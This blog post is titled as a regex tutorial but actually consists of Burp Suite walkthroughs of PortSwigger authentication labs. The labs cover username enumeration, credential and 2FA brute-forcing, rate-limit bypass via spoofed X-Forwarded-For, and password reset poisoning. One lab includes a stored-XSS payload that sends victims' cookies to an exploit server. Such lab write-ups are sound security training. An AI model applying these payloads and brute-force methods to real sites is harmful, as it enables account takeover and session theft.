---
title: "Understanding Lookahead & Lookbehind in Regex"
date: 2025-09-19 10:00:00 +0000
categories: [regex, JS]
tags: [lookahead, lookbehind, regex]
---

candidate usernames

candidate passwords

To solve this lab, I used Burp Suite Intruder to perform a two-phase brute-force attack: first to enumerate a valid username and then to identify the corresponding password. I started by browsing to the login page with Burp Proxy running and submitted a login request using an obviously invalid username and password. Then, I navigated to Proxy > HTTP history, located the POST /login request, and sent it to Intruder for further testing.

In Intruder, the username parameter was manually highlighted as a payload position, surrounded by § symbols.


username parameter was manually highlighted as a payload position
I retained a static password value and ensured that the attack type was set to Sniper, which is ideal when targeting a single parameter. I switched to the Payloads tab, verified that the payload type was set to Simple list, and pasted in a list of candidate usernames.

Press enter or click to view image in full size

pasted in a list of candidate usernames
Then I initiated the attack by clicking Start attack.

Once the attack completed, I examined the Length column in the results. Most responses had similar lengths, but one entry stood out with a length of 6466 bytes, whereas the others were shorter. Comparing the responses, I noticed that most replies said “Invalid username”, but the longer one returned “Incorrect password” instead. This discrepancy indicated a valid username, which turned out to be as400.

Press enter or click to view image in full size

one entry stood out with a length of 6466 bytes
Next, I returned to the Intruder tab, clicked Clear §, and reconfigured the payload positions by setting username=as400 and marking the password parameter as the payload position (password=§invalid-password§). I then loaded a list of candidate passwords in the Payloads tab and launched a second Sniper attack.

After the attack finished, I analyzed the Status column. All requests returned HTTP status code 200, indicating failed login attempts, except for one which returned 302 Found, typically used for redirection after a successful login. The payload for that request was querty, confirming it as the correct password for as400.

Press enter or click to view image in full size

302 Found
Finally, I returned to the login page and authenticated using the credentials as400:querty. This granted me access to the user account page, successfully completing the lab.

Press enter or click to view image in full size

Lab: Username enumeration via subtly different responses (PRACTITIONER)
Press enter or click to view image in full size

lab description
Candidate usernames

Candidate passwords

To solve this lab, I performed both username enumeration and a password brute-force attack using Burp Suite Intruder. The key vulnerability was that the application responded with subtly different error messages depending on whether the submitted username existed or not. I began by submitting a login request using a clearly invalid username and password while Burp Proxy was running. Then, in Proxy > HTTP history, I located the POST /login request and sent it to Intruder.

In the Intruder interface, the username parameter was automatically marked as a payload position. I confirmed that the attack type was set to Sniper, then switched to the Payloads tab and loaded the provided candidate username list under the Simple list payload type.

Next, I clicked on the Settings tab, expanded Grep — Extract, and added a new extraction rule. In the dialog that appeared, I scrolled through the server response until I found the message Invalid username or password. and highlighted the full text, allowing Burp to automatically set the extraction parameters. This configuration allowed me to detect small textual differences in server responses.


Show the Grep — Extract configuration with the highlighted error message
I launched the attack. Once complete, I examined the custom column containing the extracted error messages. Most entries showed the same message: Invalid username or password.but one entry differed slightly: it ended with a trailing space instead of a full stop. This subtle difference indicated that the username was valid. The valid username I identified in the Payload column was the one associated with the altered error message.

Press enter or click to view image in full size

Highlight the Intruder results where the error message differs
I returned to the Intruder tab and clicked Clear § to remove existing payload markers. I hardcoded the valid username into the request and marked the password parameter with the payload position:

username=adm&password=§test§
I then loaded the list of candidate passwords in the Payloads tab and started the second phase of the attack.

After the attack completed, I checked the Status column. All attempts returned HTTP status 200, indicating failed logins, except one request, which returned 302 Found, signaling a successful login (as the server redirected to the authenticated user’s dashboard). The corresponding password in the Payload column was the valid one.

Press enter or click to view image in full size

Highlight the 302 status code in the password brute-force results
Finally, I used the discovered credentials to log in via the web interface. This successfully authenticated me and granted access to the user account page, completing the lab.

Press enter or click to view image in full size

Lab: Username enumeration via response timing (PRACTITIONER)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Candidate usernames

Candidate passwords

I began by logging in with an invalid username and password while Burp Proxy was active. In HTTP History, I located the POST /login request and sent it to Burp Repeater. I experimented with various usernames and passwords and noticed that if I made too many failed login attempts, the server blocked further requests from my IP address.

To bypass this, I added the X-Forwarded-For header to spoof the IP address. I confirmed that the application respected this header, which let me brute-force logins without hitting rate limits. I continued experimenting in Repeater and observed that when an invalid username was used, the response time was fairly constant. However, when I submitted my known valid credentials (wiener:peter), the server took noticeably longer to respond, especially if the password was long.

This difference in response time suggested that the application only processed password verification logic if the username was valid. This led me to configure a Burp Intruder Pitchfork attack to identify valid usernames based on response times.

Press enter or click to view image in full size

Burp Intruder set to Pitchfork
For the first attack, I set two payload positions:

X-Forwarded-For: §6§ – to simulate different IPs using numbers 101–200.
username=§test§ – to test candidate usernames.
The password was set to a very long string (~100 characters). This was intentional: by making the password long, I could amplify the server’s delay if it reached the password-checking logic (which it only does when the username is valid). Short passwords might not produce a measurable difference, but long ones cause a longer delay if processed, making timing discrepancies clearer.

In the Payloads tab:

For Position 1: I used a Numbers payload type (101 to 200).
For Position 2: I used the provided list of candidate usernames.
Press enter or click to view image in full size

Payload positions on X-Forwarded-For and username. The password was set to a very long string
Once the attack was complete, I enabled the Response received and Response completed columns in the Intruder results. I sorted the responses and found that the request using the username amarillo had the longest response time: Response received = 1209ms, Response completed = 1215ms. I repeated this request a few times to confirm it consistently responded slower than the others, indicating that amarillo was a valid username.

Press enter or click to view image in full size

Highlight the long response time for username amarillo
Next, I performed a second Intruder attack to brute-force the password for the amarillo account. I again used the Pitchfork attack type with two payload positions:

X-Forwarded-For: §6§ – to spoof IPs.
password=§2§ – to test candidate passwords.
Press enter or click to view image in full size

Payload positions on X-Forwarded-For and password
This time, I hardcoded the username as amarillo and removed the long password string since password brute-forcing doesn’t rely on response time. I loaded the 201–300 IP spoofing numbers for position 1, and the list of candidate passwords for position 2.

After running the attack, I checked the Status column in the results. Most requests returned HTTP 200 OK, indicating failed login attempts. However, one request returned HTTP 302 Found, which is a strong indicator of a successful login (typically a redirect after authentication). The corresponding password for the 302 response was qwerty.

Press enter or click to view image in full size

Highlight the 302 response indicating the correct password (qwerty)
Finally, I logged in using the identified credentials:

Username: amarillo
Password: qwerty
This successfully authenticated me and gave access to the user account page, solving the lab.

Press enter or click to view image in full size

Lab: Broken brute-force protection, IP block (PRACTITIONER)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s username: carlos

Candidate passwords

In this lab, I need to brute-force the password for the user carlos despite the presence of IP-based brute-force protection. The application logic blocks an IP temporarily if three consecutive invalid login attempts are made. However, the lab contains a logic flaw that can be exploited to bypass this protection.

I started by exploring the login page using Burp Suite. After some experimentation, I noticed that after three failed login attempts, I was blocked for one minute. Interestingly, I found that if I performed two incorrect login attempts and then followed up with a successful login (using the given credentials wiener:peter), the counter would reset. This discovery was the key to bypassing the brute-force protection mechanism.

Press enter or click to view image in full size

showing 302 redirection when using valid credentials wiener:peter
To automate the attack, I used Burp Intruder with a Pitchfork attack type. I configured two payload positions, one for the username and one for the password. I created a pattern where every two brute-force attempts with username carlos were followed by one successful login using wiener:peter. This ensured the brute-force counter never reached three consecutive failures, thus avoiding the IP block.

Press enter or click to view image in full size

Intruder configuration showing pitchfork positions for username and password
I prepared two custom payload lists:

Username list: Alternating carlos, carlos, wiener.
Password list: Each candidate password (e.g., 123456, password, etc.) was paired such that the third password was always peter to match the wiener login and reset the counter.
#####Usernames#####
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener

#####Passwords#####
123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
1234
111111
peter
1234567
dragon
peter
123123
baseball
peter
abc123
football
peter
monkey
letmein
peter
shadow
master
peter
666666
qwertyuiop
peter
123321
mustang
peter
1234567890
michael
peter
654321
superman
peter
1qaz2wsx
7777777
peter
121212
000000
peter
qazwsx
123qwe
peter
killer
trustno1
peter
jordan
jennifer
peter
zxcvbnm
asdfgh
peter
hunter
buster
peter
soccer
harley
peter
batman
andrew
peter
tigger
sunshine
peter
iloveyou
2000
peter
charlie
robert
peter
thomas
hockey
peter
ranger
daniel
peter
starwars
klaster
peter
112233
george
peter
computer
michelle
peter
jessica
pepper
peter
1111
zxcvbn
peter
555555
11111111
peter
131313
freedom
peter
777777
pass
peter
maggie
159753
peter
aaaaaa
ginger
peter
princess
joshua
peter
cheese
amanda
peter
summer
love
peter
ashley
nicole
peter
chelsea
biteme
peter
matthew
access
peter
yankees
987654321
peter
dallas
austin
peter
thunder
taylor
peter
matrix
mobilemail
peter
mom
monitor
peter
monitoring
montana
peter
moon
moscow
peter
I configured Intruder’s Resource Pool to use only one concurrent request, ensuring the sequence of login attempts maintained the correct order. Then I ran the attack.

Press enter or click to view image in full size

Intruder’s Resource Pool to use only one concurrent request
Once completed, I filtered out HTTP 200 OK responses and looked for a 302 Found response under the carlos username. This indicated a successful login.

Press enter or click to view image in full size

Intruder results showing a 302 status for username carlos with password michael
After identifying the correct password (michael) for the user carlos, I manually logged in to his account and was redirected to the account page, successfully solving the lab.

Press enter or click to view image in full size

Lab: Username enumeration via account lock (PRACTITIONER)
Press enter or click to view image in full size

lab description
Candidate usernames

Candidate passwords

I started by targeting the login function with Burp Suite. I submitted an invalid username and password, intercepted the POST /login request, and sent it to Burp Intruder. I chose the Cluster bomb attack type because I needed to test multiple usernames while repeating each of them several times to potentially trigger the lockout logic. I placed payload positions on both the username and password parameters. For the second payload set (password), I used the Null payloads option and generated 5 payloads. This caused each username to be tested five times, which is likely enough to trigger any lockout mechanism.

Press enter or click to view image in full size

Intruder setup with Cluster bomb showing both payload positions.
Press enter or click to view image in full size

Setting up Cluster bomb attack with username list and 5 null password payloads to trigger lockout detection
I monitored the response lengths in the Intruder results and found that one particular username, academico, consistently produced a longer response (Length: 3292) compared to the rest.

Press enter or click to view image in full size

I manually reviewed the response body and confirmed that the server returned a different error message for academico:

Press enter or click to view image in full size

Intruder result showing academico response with longer length and different error message
You have made too many incorrect login attempts. Please try again in 1 minute(s).
This confirmed that academico is a valid username since the lockout logic only triggers for existing accounts. In contrast, all other usernames returned the generic message: Invalid username or password.

Next, I proceeded to brute-force the password for academico. I sent a new POST /login request to Burp Intruder and selected the Sniper attack type, since I only needed to test one parameter this time: the password. I fixed the username as academico and marked the password field as the payload position. Then I added the password list provided by PortSwigger.

Press enter or click to view image in full size

Configuring Sniper attack to brute-force the password for the valid user academico
During the attack, I noticed that one of the requests received a shorter response (Length: 3162) and lacked any error message. This was a strong indication of a successful login attempt. The corresponding password in this case was 777777.

Press enter or click to view image in full size

Intruder results showing response with unique length and no error for password 777777
I waited for a minute to let the lockout reset and then logged in using the credentials academico:777777. I was successfully redirected to the account page, confirming that the lab was solved.

Press enter or click to view image in full size

Lab: 2FA simple bypass (APPRENTICE)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s credentials carlos:montoya

I began by logging into my own account using the credentials wiener:peter. After entering my username and password, the application redirected me to a 2FA verification page, prompting for a 4-digit code.

Press enter or click to view image in full size

2FA verification page
I clicked the Email client button and retrieved the 2FA code sent to wiener’s email.

Press enter or click to view image in full size

Email client showing 2FA code sent to wiener
After entering the code, I was redirected to my account page. While observing the URL, I noticed it pointed to the following endpoint:


URL after successful login for wiener showing /my-account?id=wiener
This revealed a potential weakness, the account page was directly accessible via a query parameter that specified the user ID. I hypothesized that the server might not enforce 2FA validation properly when accessing the /my-account endpoint directly with a different ID.

Next, I logged out and logged in using Carlos’s credentials: carlos:montoya. As expected, I was again redirected to the 2FA verification page. However, instead of entering a code, I manually changed the URL in the browser to:
/my-account?id=carlos


Bypassing the 2FA step by directly accessing the victim’s account endpoint
This redirected me straight to Carlos’s account page without requiring any 2FA code. The lack of server-side validation on this endpoint allowed me to bypass the second authentication factor entirely. Upon successful redirection, the lab was marked as solved.

Press enter or click to view image in full size

Lab: 2FA broken logic (PRACTITIONER)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s username: carlos

I started by logging in using my own credentials (wiener:peter). After entering the username and password, I was redirected to the 2FA page. I then accessed the email client to retrieve the 2FA code and successfully logged into my own account. While inspecting the HTTP history in Burp Suite, I noticed that a POST /login2 request was sent to submit the 2FA code. Importantly, this request included a verify=wiener cookie. I also saw a corresponding GET /login2 request which appeared to trigger the sending of the 2FA code.

Press enter or click to view image in full size

Burp Suite showing the GET /login2 requests with verify=wiener
Press enter or click to view image in full size

Burp Suite showing the POST /login2 requests with verify=wiener
I then tested a theory:

What if I could get a 2FA code generated for Carlos by sending a GET /login2 request with the verify cookie set to carlos? I forwarded that modified request using Burp Repeater, which likely caused the server to email a 2FA code to Carlos’s inbox. Even though I didn't know Carlos's password to go through the normal login flow, I could still try brute-forcing the 4-digit code using Burp Intruder.

Press enter or click to view image in full size

Burp Repeater request with GET /login2 and verify=carlos
Next, I set up a POST /login2 request in Burp Intruder to brute-force the 4-digit mfa-code for Carlos. I used a numeric payload (0000–9999) and kept the verify=carlos cookie in place.

Press enter or click to view image in full size

set up a POST /login2 request in Burp Intruder
Press enter or click to view image in full size

used a numeric payload (0000–9999)
My goal was to look for a 302 Found status response, which would indicate a successful login. After running the attack, I discovered that the code 0843 returned a 302 redirect to /my-account?id=carlos.

Press enter or click to view image in full size

Burp Intruder result showing a 302 Found with correct 2FA code
However, I still couldn’t directly log in as Carlos because I didn’t know his password, which is normally required before submitting a 2FA code. To bypass this, I took the session cookie from the 302 response and manually replaced my browser’s current session (from the wiener login) with the stolen carlos session cookie.

Press enter or click to view image in full size

Switching to the victim’s session after obtaining a valid 2FA code and session ID
After replacing the session cookie, I refreshed the /my-account page and was successfully logged in as Carlos, solving the lab.

Press enter or click to view image in full size

Lab: Brute-forcing a stay-logged-in cookie (PRACTITIONER)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s username: carlos

Candidate passwords

I logged in using the provided credentials:

wiener:peter
and ensured the "Stay logged in" checkbox was enabled. After logging in, I intercepted the request to /my-account using Burp Suite and inspected the stay-logged-in cookie.

Press enter or click to view image in full size

inspected the stay-logged-in cookie
Press enter or click to view image in full size

decoded the stay-logged-in cookies base64
Press enter or click to view image in full size

check the peter’s md5sum
Upon decoding the Base64 value, I observed the format:

wiener:51dc30ddc473d43a6011e9ebba6ca770
The right-hand portion of the string resembled an MD5 hash. I confirmed this by hashing the password peter using an MD5 hash generator, which produced the same value. This indicated that the cookie is generated using the following pattern:

stay-logged-in = base64(username + ":" + md5(password))
After logging out, I captured the previous GET /my-account request and sent it to Burp Intruder. I then replaced the value of stay-logged-in with a payload marker. In the payload list, I added a dictionary of candidate passwords.

Under Payload Processing, I added a series of transformations:

Hash the payload using MD5
Add the prefix carlos: (to imitate Carlos’s cookie format)
Base64 encode the entire string
Press enter or click to view image in full size

added a series of transformations under Payload Processing
I also modified the request parameter from id=wiener to id=carlos, ensuring the request targeted Carlos’s account.


modified the request parameter from id=wiener to id=carlos
To detect a successful login, I configured Burp Intruder to grep for the phrase Update email in the HTTP response, which only appears for authenticated users.

Press enter or click to view image in full size

To detect a successful login, I monitored the HTTP status code and content length in Burp Intruder rather than relying on a grep match. Most of the requests returned a 302 Found status with a short response length (around 173 bytes), which indicated redirection due to failed login. However, one request returned a 200 OK response with a longer content length (3346 bytes). This anomaly strongly indicated that the stay-logged-in cookie for that request had successfully authenticated me as Carlos.

Press enter or click to view image in full size

This confirms a successful brute-force attempt by highlighting the request with a different status code and content length, indicating valid authentication as Carlos
I copied the Base64-encoded value of the successful cookie and manually added it to my browser using the developer tools. After refreshing the page, I was redirected to Carlos’s account page, which confirmed unauthorized access.

Press enter or click to view image in full size

Lab: Offline password cracking (PRACTITIONER)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s username: carlos

I first logged into my account using the provided credentials (wiener:peter) and ensured the "Stay logged in" option was checked. With Burp Suite running, I intercepted the login request and examined the HTTP response in the Proxy > HTTP history tab. I observed that the server responded with a Set-Cookie header containing the stay-logged-in cookie. I sent this cookie value to Burp Decoder and Base64-decoded it, revealing the format wiener:<md5_hash>.

Press enter or click to view image in full size

revealing the format wiener:<md5_hash>
This showed that the cookie was simply the concatenation of the username and an MD5 hash of the password.

Next, I moved on to locating a client-side vulnerability that could be used to exfiltrate Carlos’s authentication cookie. I browsed one of the blog pages and tested for stored XSS by submitting a comment containing <script>alert(1)</script>.

Press enter or click to view image in full size

tested for stored XSS
When the alert box popped up, I confirmed that stored XSS was present in the comment feature.

Press enter or click to view image in full size

alert box popped up
I then crafted a malicious payload to exfiltrate cookies by redirecting the document location to my exploit server:

<script>document.location='//exploit-0acd00b8032c275180d61b2b014e0021.exploit-server.net/'+document.cookie</script>
Press enter or click to view image in full size

sent the malicious payload to exfiltrate cookies by redirecting the document location
I posted this payload as a comment on the blog page. Then, I navigated to the Exploit Server and monitored the Access log. After a few moments, Carlos visited the blog post, triggering the payload. In the access log, I observed a GET request containing his stay-logged-in cookie.

Press enter or click to view image in full size

a GET request containing carlos stay-logged-in cookie
I copied the cookie and decoded it using Burp Decoder.

Press enter or click to view image in full size

decode the base64
I suspected the hash to be an MD5 of Carlos’s password. I then pasted the hash into an online hash lookup (CrackStation). The password was found to be onceuponatime, indicating that Carlos had used a weak and common password.

Press enter or click to view image in full size

password was found to be onceuponatime
With Carlos’s credentials in hand, I logged into the application using carlos:onceuponatime.

Press enter or click to view image in full size

carlos’s account
After successful authentication, I navigated to the My account page and clicked on Delete account.

Press enter or click to view image in full size

Lab: Password reset broken logic (APPRENTICE)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s username: carlos

I started by clicking the “Forgot your password?” link and submitted the username wiener to trigger a password reset. I then accessed the reset link via the provided email client and set a new password. While monitoring the traffic using Burp Suite, I identified that the password reset request was sent as a POST request to the endpoint /forgot-password, with a URL parameter temp-forgot-password-token and a POST body that included the new password and the username.

Press enter or click to view image in full size

parameter temp-forgot-password-token and a POST body that included the new password and the username (wiener’s account)
I sent this request to Burp Repeater and began testing the token handling logic. By removing the value of the temp-forgot-password-token from both the URL and request body, I was still able to reset the password for my account. This confirmed that the server was not validating the reset token at all, making it vulnerable to a logic flaw.

To exploit this, I just modified the username parameter to carlos. I changed the new-password value to a password of my choice. Upon sending the modified request, I received a 200 OK response, indicating that Carlos's password was successfully reset without a valid token.

Press enter or click to view image in full size

Modified the username parameter to carlos. Changed the new-password value to 12345
Press enter or click to view image in full size

received a 200 OK response, indicating that Carlos’s password was successfully reset without a valid token
Finally, I logged in to the application using the credentials carlos:12345 and navigated to the "My account" page. The presence of Carlos's profile confirmed that I had successfully gained unauthorized access by exploiting the broken logic in the password reset mechanism.

Press enter or click to view image in full size

Lab: Password reset poisoning via middleware (PRACTITIONER)
Press enter or click to view image in full size

lab description
I began by analyzing the normal password reset flow. I logged in as wiener:peter and initiated a password reset through the "Forgot your password?" feature. I observed that the reset email included a GET request link that used a temp-forgot-password-token as a URL parameter. This token was used to authenticate the reset request. Using Burp Suite, I captured the POST /forgot-password request and noticed that the server supported the X-Forwarded-Host header.

The X-Forwarded-Host header is often used by reverse proxies or middleware to tell the backend application which hostname was originally requested by the client. If the application uses this header unsafely when building links (such as password reset URLs), an attacker can inject their own domain, causing the application to generate links pointing to an attacker-controlled server. This is known as password reset poisoning.

I exploited this behavior by crafting a password reset request for Carlos. In Burp Repeater, I modified the request and added the following header:

X-Forwarded-Host: exploit-0a9b00ab1ee8d11fc21d1a6d00f400c5.exploit-server.net
I also changed the body parameter to username=carlos. This caused the backend to generate a reset link for Carlos that pointed to my exploit server instead of the legitimate application.

Press enter or click to view image in full size

Shows the POST /forgot-password request in Burp Repeater with X-Forwarded-Host set to my exploit server and username=carlos
After sending the poisoned request, I visited the exploit server’s access log and found a GET request from Carlos, which included his temp-forgot-password-token in the query string. I copied that token for later use.

Press enter or click to view image in full size

carlos’s reset password token
Next, I used the reset link originally sent to wiener (my account), which looked like:

/forgot-password?temp-forgot-password-token=iufom9tc80i72a99j7qsbfcktlpxrd6o
But instead of using the original token for wiener, I replaced it with Carlos’s token that I stole:

/forgot-password?temp-forgot-password-token=zpwfrggd8sn9sqns6aqcwyeuxa5c6228
Press enter or click to view image in full size

replace wiener’s token with carlos’s token
I accessed this modified URL in the browser, which opened a password reset form. I entered a new password and submitted it.

Even though the URL originally belonged to my account, replacing the token in both the URL and body allowed me to reset Carlos’s password instead. I then successfully logged in to Carlos’s account using the new password and accessed his “My account” page, completing the lab.

Press enter or click to view image in full size

Lab: Password brute-force via password change (PRACTITIONER)
Press enter or click to view image in full size

lab description
Your credentials: wiener:peter

Victim’s username: carlos

Candidate passwords

The lab provides credentials for a low-privilege user wiener:peter, and my goal was to brute-force the current password of the victim user carlos using a wordlist of candidate passwords.

After logging in as wiener, I navigated to the Change Password feature. The form required three fields:

current password,
new password,
and confirm new password.
I tested how the application responds under different input scenarios. When I entered:

Correct current password + mismatched new passwords, I received the error:
“New passwords do not match.”
Press enter or click to view image in full size

Incorrect current password + mismatched new passwords, I received a different error:
“Current password is incorrect.”
Press enter or click to view image in full size

This behavior indicated a response-based oracle. If I supplied a correct current password, the backend would respond differently even when the new password confirmation failed. I could exploit this subtle difference to brute-force the correct current password of carlos without locking the account or triggering account protection mechanisms.

To do this, I captured the POST /my-account/change-password request and modified the body to target carlos instead of wiener. I used Burp Suite Intruder and placed a payload marker around the current-password field. For the new-password-1 and new-password-2 fields, I deliberately used two different values (pass and pass1) to maintain the same "do not match" behavior.

Here is the payload I sent:

Press enter or click to view image in full size

I loaded the provided wordlist of candidate passwords into Burp Intruder and started the attack. I then added a Grep Match rule for the string New passwords do not match. Only the correct password would trigger this message when passed to current-password, since only the correct password bypasses the initial credential check and reaches the new password validation logic.

From the Intruder results, one response stood out. It had a length of 4010, while others were 4013, and it contained the message New passwords do not match.

Press enter or click to view image in full size

The response had a length of 4010, while others were 4013, and it contained the message New passwords do not match
That indicated the current password was valid. The correct password for carlos turned out to be klaster.

I then logged out of wiener and logged in as carlos with the discovered password klaster. Clicking on the My account link confirmed the login, and the lab was solved.

Press enter or click to view image in full size

